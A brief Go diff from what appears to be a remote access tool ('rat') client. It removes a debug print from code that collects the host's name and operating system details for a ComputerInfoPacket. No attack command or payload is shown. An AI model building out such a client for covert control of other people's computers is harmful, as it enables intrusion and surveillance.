@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"oslib"
 	"rat/client/computer"
 	"rat/common"
@@ -25,6 +24,4 @@ func (packet *ComputerInfoPacket) Init() {
 	packet.Hostname = u.Hostname
 	packet.OperatingSystemName = oslib.Name
 	packet.OperatingSystemDisplayName = oslib.GetDisplay()
-
-	fmt.Println("Inside init()", packet)
 }
